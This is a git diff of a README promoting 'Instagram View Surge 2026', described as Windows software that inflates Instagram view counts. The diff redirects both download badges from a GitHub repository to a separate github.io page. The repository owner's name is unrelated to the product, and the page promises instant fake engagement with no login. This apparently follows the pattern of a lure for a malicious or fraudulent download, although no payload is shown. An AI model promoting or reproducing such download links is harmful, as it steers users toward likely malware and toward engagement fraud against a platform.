@@ -1,6 +1,6 @@
 # 🚀 Instagram-View-Surge-2026---Fast-View-Boosting-Software-for-Windows - Boost Your Instagram Views Instantly and Effortlessly
 
-[![Download Instagram View Surge 2026](https://img.shields.io/badge/Download-Instagram_View_Surge_2026-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Globalclimatechangemonitor5146/Instagram-View-Surge-2026---Fast-View-Boosting-Software-for-Windows)
+[![Download Instagram View Surge 2026](https://img.shields.io/badge/Download-Instagram_View_Surge_2026-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://globalclimatechangemonitor5146.github.io)
 
 ## 📥 Getting Started
 
@@ -233,6 +233,6 @@ Don't let your great content go unnoticed. With Instagram View Surge 2026, getti
 
 .
 
- [![Download Now](https://img.shields.io/badge/Download_Now-Get_Started-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Globalclimatechangemonitor5146/Instagram-View-Surge-2026---Fast-View-Boosting-Software-for-Windows)
+ [![Download Now](https://img.shields.io/badge/Download_Now-Get_Started-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://globalclimatechangemonitor5146.github.io)
 
 Windows 10/11 Compatible | No Login Required | Instant Results
